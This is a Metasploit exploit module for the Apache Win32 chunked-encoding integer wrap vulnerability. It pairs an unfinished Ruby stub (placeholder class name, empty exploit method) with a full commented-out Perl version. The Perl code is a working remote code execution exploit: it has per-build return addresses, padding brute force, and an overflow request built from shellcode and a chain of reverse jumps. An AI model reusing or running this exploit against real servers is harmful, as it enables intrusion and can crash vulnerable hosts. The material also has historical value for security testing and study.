require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Apache Win32 Chunked Encoding',
			'Description'    => %q{
				This module exploits the chunked transfer integer wrap
				vulnerability in Apache version 1.2.x to 1.3.24. This
				particular module has been tested with all versions of the
				official Win32 build between 1.3.9 and 1.3.24. Additionally,
				it should work against most co-branded and bundled versions
				of Apache (Oracle 8i, 9i, IBM HTTPD, etc).

				You will need to use the Check() functionality to determine
				the exact target version prior to launching the exploit. The
				version of Apache bundled with Oracle 8.1.7 will not
				automatically restart, so if you use the wrong target value,
				the server will crash.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '838'],
					[ 'URL', 'http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html'],
					[ 'MIL', '4'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 987,
					'BadChars' => "\x00\x2b\x26\x3d\x25\x0a\x0d\x20",
					'MinNops'  => 200,
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff\x44",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winnt, win2003, winxp',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jun 19 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::apache_chunked_win32;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $info =
{
	'Name'  => 'Apache Win32 Chunked Encoding',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winnt', 'win2003', 'winxp' ],
	'Priv'  => 1,
	'UserOpts'  => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	},

	'Payload' => 
	{
		'Space'		=> 987,
		'MinNops'	=> 200,
		'BadChars'	=> "\x00+&=%\x0a\x0d\x20",
		'Keys' 		=> ['+ws2ord'],	
		# sub esp, 4097 + inc esp makes stack happy
		'Prepend'	=> "\x81\xc4\xff\xef\xff\xff\x44",		
	},
    
	'Description'  => Pex::Text::Freeform(qq{
		This module exploits the chunked transfer integer wrap vulnerability
		in Apache version 1.2.x to 1.3.24. This particular module has been
		tested with all versions of the official Win32 build between 1.3.9 and
		1.3.24. Additionally, it should work against most co-branded and bundled
		versions of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
		
		You will need to use the Check() functionality to determine the exact target 
		version prior to launching the exploit. The version of Apache bundled with 
		Oracle 8.1.7 will not automatically restart, so if you use the wrong target 
		value, the server will crash.
	}),
     
    'Refs'  =>  
	[
		['OSVDB',   838],
		['URL',     'http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html'],
		['MIL',       4],
	],

	# All return addresses are pop/pop/ret's...
	'Targets' => 
	[
		['Windows Generic Bruteforce'],

		# Official Apache.org Win32 Builds
		['Apache.org Build 1.3.9->1.3.19',		0x00401151, [6,2,0,4,1,3,5,7] ],
		['Apache.org Build 1.3.22/1.3.24',		0x00401141, [2,6,0,4,1,3,5,7] ],
		['Apache.org Build 1.3.19/1.3.24',		0x6ff6548d, [2,6,0,4,1,3,5,7] ],
		['Apache.org Build 1.3.22',				0x6ff762ac, [2,6,0,4,1,3,5,7] ],
		
		# Return to Win9xConHook.dll via call ebx
		['Apache.org Build 1.3.17->1.3.24 (Windows 2000)',		0x1c0f13e5, [2,6,0,4,1,3,5,7] ],
		
		# Return to Win9xConHook.dll via call esi		
		['Apache.org Build 1.3.17->1.3.24 (Windows NT 4.0)',	0x1c0f1033, [2,6,0,4,1,3,5,7] ],

		# Interesting return to PEB trick for Windows 2003 systems...	
		[ 'Windows 2003 English SP0',	0x7ffc0638, [2,6,5,4,1,3,0,7] ], # peb :)

		# Pop/Pop/Return on Windows 2000	
		[ 'Windows 2000 English',	0x75022ac4, [2,6,5,4,1,3,0,7] ],
		
		# Oracle HTTPD: [ 8.1.7 ] (one shot)
		#    Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.22
		['Oracle 8.1.7 Apache 1.3.12',	0x1d84d42c, [7] ],	

		# Oracle HTTPD: [ 9.1.0 ] (multiple shots)
		#    Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.24
		['Oracle 9.1.0 Apache 1.3.12',	0x10016061, [5,6,0,4,1,3,2,7] ],	
		
		# Oracle HTTPD: [ 9.2.0 ] (multiple shots)
		#	 Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25
		['Oracle 9.2.0 Apache 1.3.22',	0x6ff6427a, [5,6,0,4,1,3,2,7] ],		
					
		# Generic debugging targets
		[ 'Debugging Target',	0xcafebabe, [0,1,2,3,4,5,6,7] ],
	],

	'Keys'  => ['apache'],

	'DisclosureDate' => 'Jun 19 2002',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host, 
		'PeerPort'  => $target_port, 
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET / HTTP/1.0\r\n\r\n");
	my $res = $s->Recv(-1, 5);
	$s->Close();
    
    if (! $res) {
        $self->PrintLine("[*] No response to request");
        return $self->CheckCode('Generic');
    }
    
	if ($res =~ m/^Server:([^\n]+)/sm) {
		my $svr = $1;
		$svr =~ s/(^\s+|\r|\s+$)//g;

		if ($svr eq 'Oracle HTTP Server Powered by Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.22') {
			$self->PrintLine("[*] Vulnerable server '$svr'");
			$self->PrintLine("[*] This looks like an Oracle 8.1.7 Apache service (one-shot only)");
			return $self->CheckCode('Appears');
		}

		if ($svr eq 'Oracle HTTP Server Powered by Apache/1.3.12 (Win32) ApacheJServ/1.1 mod_ssl/2.6.4 OpenSSL/0.9.5a mod_perl/1.24') {
			$self->PrintLine("[*] Vulnerable server '$svr'");
			$self->PrintLine("[*] This looks like an Oracle 9.1.0 Apache service (multiple tries allowed)");
			return $self->CheckCode('Appears');
		}

		if ($svr eq 'Oracle HTTP Server Powered by Apache/1.3.22 (Win32) mod_plsql/3.0.9.8.3b mod_ssl/2.8.5 OpenSSL/0.9.6b mod_fastcgi/2.2.12 mod_oprocmgr/1.0 mod_perl/1.25') {
			$self->PrintLine("[*] Vulnerable server '$svr'");
			$self->PrintLine("[*] This looks like an Oracle 9.2.0 Apache service (multiple tries allowed)");
			return $self->CheckCode('Appears');
		}
		
		# These signatures were taken from the apache_chunked_encoding.nasl Nessus plugin
		if ($svr =~ /IBM_HTTP_SERVER\/1\.3\.(19\.[3-9]|2[0-9]\.)/) {
			$self->PrintLine("[*] IBM backported the patch, this system is not vulnerable");
			return $self->CheckCode('Safe');
		} 
		elsif ( $svr =~ /Apache(-AdvancedExtranetServer)?\/(1\.([0-2]\.[0-9]|3\.([0-9][^0-9]|[0-1][0-9]|2[0-5]))|2\.0.([0-9][^0-9]|[0-2][0-9]|3[0-8]))/) {
			$self->PrintLine("[*] Vulnerable server '$svr'");
			return $self->CheckCode('Appears');
		}

		$self->PrintLine("[*] Server is probably not vulnerable '$svr'");
		return $self->CheckCode('Safe');
	}

	# Return true if there is no server banner
	$self->PrintLine("[*] No server banner was found in the HTTP headers");
	return $self->CheckCode('Unknown');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my @targets;
	my @offsets;
	my $pad;

	if (! $self->InitNops(16)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	# Brute force everything :-)
	if ($target_idx == 0) {
		@targets = @{$self->Targets};
		shift(@targets);
	} else {
		@targets = ( $self->Targets->[ $target_idx ] );
	}

	foreach my $target (@targets) {
		foreach my $pad (@{ $target->[2] }) {
			my $request;
			$request  = "GET / HTTP/1.1\r\n";
			$request .= "Host: $target_host:$target_port\r\n";
			$request .= "Transfer-Encoding: CHUNKED\r\n";
			$request .= "\r\n";

			my $fatality = $self->MakeNops(6) ."\xe9". pack('V', -900) ."pP";
			my $pattern = Pex::Text::AlphaNumText(3936) .$shellcode.$fatality. Pex::Text::AlphaNumText($pad);
			
			# Move slightly further back to allow padding changes
			$pattern .= "\xeb\xf0\xde\xad";
			$pattern .= pack('V', $target->[1]);

			# Create a chain of return addresses and reverse jumps
			for (2 .. 256) {
				$pattern .= "\xeb\xf6\xbe\xef";
				$pattern .= pack('V', $target->[1]);
			}	
			
			# Even out the request length based on the padding value
			# This is required to reliably hit the return address offset
			$pattern .= Pex::Text::AlphaNumText(8-$pad);
			
			# Place our string after the evil chunk size...
			$request .= "FFFFFFF0 ". $pattern;

			##
			# Regardless of what return we hit, execution jumps backwards to the shellcode:
			#                                   _______________ _______________ ___________
			#       _________    _____________  | ________    | | ______      | | ______
			#       v       |    v           |  v v      |    | v v    |      | v v    |
 			# [shellcode] [jmp -949] [pad] [jmp -16] [ret] [jmp -8] [ret] [jmp -8] [ret]
			##
			
			my $ccount = 0;

AGAIN:
			my $s = Msf::Socket::Tcp->new
			(
				'PeerAddr'  => $target_host, 
				'PeerPort'  => $target_port, 
				'LocalPort' => $self->GetVar('CPORT'),
				'SSL'       => $self->GetVar('SSL'),
			);
			if ($s->IsError) {
				$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
				return if $ccount > 2;
				
				# Give the server a second to recover
				sleep(1);
				
				# Increment the error counter and try it again
				$ccount++;
				goto AGAIN;
			}

			$self->PrintLine("[*] Trying ". $target->[0] ." [ " . sprintf("0x%.8x", $target->[1]) ."/$pad ]");
			$s->Send($request);
			$self->Handler($s);
			$s->Close();
			
			# Give the server time to hit the exception and execute payload
			sleep(2);
		}
	}
	return;
}


1;

=end


end
end	
